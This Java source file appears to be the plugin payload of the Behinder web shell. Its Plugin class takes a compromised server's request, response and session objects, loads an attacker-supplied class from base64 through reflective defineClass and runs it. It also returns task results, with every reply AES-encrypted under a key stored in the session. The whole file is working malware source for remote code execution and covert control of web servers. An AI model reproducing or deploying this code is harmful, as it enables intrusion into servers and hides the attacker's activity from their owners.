package net.rebeyond.behinder.payload.java;

import java.lang.reflect.Method;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Plugin {
    public static String action;
    public static String payload;
    public static String taskID;
    private Object Request;
    private Object Response;
    private Object Session;

    public boolean equals(Object obj) {
        Map<String, String> result = new HashMap<>();
        try {
            fillContext(obj);
            if (action.equals("submit")) {
                ClassLoader classLoader = getClass().getClassLoader();
                try {
                    Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                    method.setAccessible(true);
                    byte[] payloadData = base64decode(payload);
                    Class payloadCls = (Class) method.invoke(classLoader, payloadData, 0, Integer.valueOf(payloadData.length));
                    Object payloadObj = payloadCls.newInstance();
                    payloadCls.getDeclaredMethod("execute", Object.class, Object.class, Object.class).invoke(payloadObj, this.Request, this.Response, this.Session);
                    result.put("msg", "任务提交成功");
                    result.put("status", "success");
                    try {
                        Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                        so.getClass().getMethod("write", byte[].class).invoke(so, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                        so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                        so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                    } catch (Exception e) {
                    }
                } catch (Exception e2) {
                    result.put("msg", e2.getMessage());
                    result.put("status", "fail");
                    try {
                        Object so2 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                        so2.getClass().getMethod("write", byte[].class).invoke(so2, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                        so2.getClass().getMethod("flush", new Class[0]).invoke(so2, new Object[0]);
                        so2.getClass().getMethod("close", new Class[0]).invoke(so2, new Object[0]);
                    } catch (Exception e3) {
                    }
                } catch (Throwable th) {
                    try {
                        Object so3 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                        so3.getClass().getMethod("write", byte[].class).invoke(so3, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                        so3.getClass().getMethod("flush", new Class[0]).invoke(so3, new Object[0]);
                        so3.getClass().getMethod("close", new Class[0]).invoke(so3, new Object[0]);
                    } catch (Exception e4) {
                    }
                    throw th;
                }
            } else if (action.equals("getResult")) {
                try {
                    Map<String, String> taskResult = (Map) sessionGetAttribute(this.Session, taskID);
                    Map<String, String> temp = new HashMap<>();
                    temp.put("running", taskResult.get("running"));
                    temp.put("result", base64encode(taskResult.get("result")));
                    result.put("msg", buildJson(temp, false));
                    result.put("status", "success");
                    try {
                        Object so4 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                        so4.getClass().getMethod("write", byte[].class).invoke(so4, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                        so4.getClass().getMethod("flush", new Class[0]).invoke(so4, new Object[0]);
                        so4.getClass().getMethod("close", new Class[0]).invoke(so4, new Object[0]);
                    } catch (Exception e5) {
                    }
                } catch (Exception e6) {
                    result.put("msg", e6.getMessage());
                    result.put("status", "fail");
                    try {
                        Object so5 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                        so5.getClass().getMethod("write", byte[].class).invoke(so5, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                        so5.getClass().getMethod("flush", new Class[0]).invoke(so5, new Object[0]);
                        so5.getClass().getMethod("close", new Class[0]).invoke(so5, new Object[0]);
                    } catch (Exception e7) {
                    }
                } catch (Throwable th2) {
                    try {
                        Object so6 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                        so6.getClass().getMethod("write", byte[].class).invoke(so6, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                        so6.getClass().getMethod("flush", new Class[0]).invoke(so6, new Object[0]);
                        so6.getClass().getMethod("close", new Class[0]).invoke(so6, new Object[0]);
                    } catch (Exception e8) {
                    }
                    throw th2;
                }
            }
            return true;
        } catch (Exception e9) {
            result.put("msg", e9.getMessage());
            result.put("status", "fail");
            return true;
        }
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        SecretKeySpec skeySpec = new SecretKeySpec(this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString().getBytes("utf-8"), "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        return cipher.doFinal(bs);
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    getClass();
                    Class Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                } else {
                    getClass();
                    Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
                    value = ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, value.getBytes("UTF-8"))).replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }

    private String base64encode(String clearText) throws Exception {
        if (System.getProperty("java.version").compareTo("1.9") >= 0) {
            getClass();
            Class Base64 = Class.forName("java.util.Base64");
            Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
            return (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, clearText.getBytes("UTF-8"));
        }
        getClass();
        Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
        return ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, clearText.getBytes("UTF-8"))).replace("\n", "").replace("\r", "");
    }

    private byte[] base64decode(String base64Text) throws Exception {
        if (System.getProperty("java.version").compareTo("1.9") >= 0) {
            getClass();
            Class Base64 = Class.forName("java.util.Base64");
            Object Decoder = Base64.getMethod("getDecoder", null).invoke(Base64, null);
            return (byte[]) Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text);
        }
        getClass();
        Object Decoder2 = Class.forName("sun.misc.BASE64Decoder").newInstance();
        return (byte[]) Decoder2.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder2, base64Text);
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map<String, Object> objMap = (Map) obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }
        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }

    private Object sessionGetAttribute(Object session, String key) {
        try {
            return session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
        } catch (Exception e) {
            return null;
        }
    }

    private void sessionSetAttribute(Object session, String key, Object value) {
        try {
            session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
        } catch (Exception e) {
        }
    }

    private Enumeration sessionGetAttributeNames(Object session) {
        try {
            return (Enumeration) session.getClass().getMethod("getAttributeNames", new Class[0]).invoke(session, new Object[0]);
        } catch (Exception e) {
            return null;
        }
    }

    private void sessionRemoveAttribute(Object session, String key) {
        try {
            session.getClass().getMethod("removeAttribute", new Class[0]).invoke(session, key);
        } catch (Exception e) {
        }
    }
}
